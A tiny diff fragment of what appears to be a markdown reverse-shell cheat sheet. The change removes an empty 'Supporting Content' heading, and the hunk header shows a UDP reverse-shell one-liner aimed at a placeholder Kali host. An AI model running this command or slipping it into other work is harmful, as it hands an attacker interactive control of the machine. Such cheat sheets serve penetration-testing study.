@@ -24,5 +24,3 @@ sh -i >& /dev/udp/KALI_IP/9999 0>&1
 ```
 
 ---
-### Supporting Content
-- 
